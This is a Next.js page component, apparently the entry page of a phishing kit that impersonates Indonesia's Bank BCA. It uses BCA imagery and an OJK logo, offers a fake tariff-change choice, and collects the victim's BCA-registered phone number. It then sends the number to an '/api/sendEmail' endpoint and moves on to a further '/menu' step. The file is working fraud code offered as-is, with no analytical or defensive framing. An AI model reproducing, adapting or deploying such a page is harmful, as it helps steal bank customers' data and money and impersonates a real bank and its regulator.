import { useRouter } from "next/router"
import { useState } from "react"

export default function Home({host}) {

	const [nohp, setNohp] = useState("+62")
	
	const router = useRouter()

	const handleNoHp = async () => {

		if (nohp !== "+62")   {
			
			document.getElementById('btn').innerHTML = 'Loading...'
			
			localStorage.setItem('nohp', nohp)
			
			const body = {
				nohp
			}
			
			try {
				
				const response = await fetch('/api/sendEmail',{
					method : 'POST',
					headers: {
						'Content-Type': 'application/json',
						'url': host
					},
					body: JSON.stringify(body)
				})
				
				const json = await response.json()
				
				if (json.status === 200) {
					router.push('/menu')
					document.getElementById('btn').innerHTML = 'Klik Selanjutnya'
				} else{
					document.getElementById('btn').innerHTML = 'Klik Selanjutnya'
				}
				
			} catch (error) {
				document.getElementById('btn').innerHTML = 'Klik Selanjutnya'
				console.log(error);
			}

		}


	}

    return (
		<div className="container-mobile">
			<div className="silde">
				<img src="/bgSlideBca.gif" alt="bg-silde" className="bg-silde"/>
			</div>
			<div className="pd">
				<div className="form">
					<div>
						<h4 className="title-1">Silahkan pilih tarif transaksi Anda</h4>
					</div>
					<div className="flex-form">
						<input type="checkbox" className="form-check" id="tarif1"/>
						<label className="label-form" htmlFor="tarif1">Tarif Baru Rp 150.000/perbulan </label>
					</div>
					<div className="flex-form">
						<input type="checkbox" className="form-check" id="tarif2"/>
						<label className="label-form" htmlFor="tarif2">Tarif Normal Rp 6,500/pertransaksi </label>
					</div>
					<div>
						<h4 className="title-1">Nomor Handphone Anda yang terdaftar di BANK BCA</h4>
					</div>
					<div>
						<input type="text" maxLength="15" className="text-form" value={nohp} onChange={(e)=>setNohp(e.target.value)} placeholder="(999) 999-999-999"/>
					</div>
					<div className="mt">
						<button onClick={handleNoHp} type="button" className="btn-submit" id="btn">Klik Selanjutnya</button>
					</div>
					<img src="/ojk.jpg" alt="ojk" className="img-footer"/>
				</div>
			</div>
		</div>
    )
}

export async function getServerSideProps(context) {

	const host = context.req.headers.host
	
	return {
		props: {
			host
		},
	}
}
